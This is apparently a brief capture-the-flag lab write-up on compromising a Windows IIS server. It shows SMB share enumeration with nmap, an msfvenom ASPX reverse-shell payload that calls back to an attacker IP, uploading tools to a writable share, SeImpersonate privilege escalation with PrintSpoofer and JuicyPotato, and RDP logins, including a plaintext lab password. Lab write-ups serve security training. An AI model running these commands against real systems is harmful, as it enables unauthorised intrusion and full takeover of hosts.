Initial scans showed numerous ports open
80, 49663 had default MS ISS webpage hosted on them
139, 445 were smb
and a few others that dint really help us
To enumerate further, nmap smb
`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.201.94.198`
showed there isa n4wrksv share that is open for read/write
so went in there and found a password.txt, base64 encoded.

NOTE - smb shares can someties be hosted on website ports.
wasn't on port 80, was on :49663/n4wrksv/passwords.txt, was displayed on the webpage.
Following this, create an aspx payload, start listener, and open that wepage.
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT=1234 -f aspx -o rev.aspx`
low-level priv!
user flag in Desktop
went to c:\intpub\wwwroot where the n4wrksv was located.
went back to smb, put the jp, printspoofer and rshel.exe

Now, whoami /priv showed SeImprsonate token enabled. sysinfo showed windows 2016
Tried juicypotato (while logical choice is printspoofer, as tasklist showed the svspool running)
`.\jpm.exe -l 1337 -c "{C5D3C0E1-DC41-4F83-8BA8-CC0D46BCCDE3}" -p rshell.exe -t *` -- dint work

then `PrintSpooferx64.exe -i -c cmd`
gave root priv

---
tried logging in using rdp
xfreerdp /u:bill /v:10.10.0.170 + clipboard
xfreerdp /u:bob /v:10.10.0.170 + clipboard
`xfreerdp3 /u:Wade /p:parzival /v:10.201.75.197:3389 +clipboard`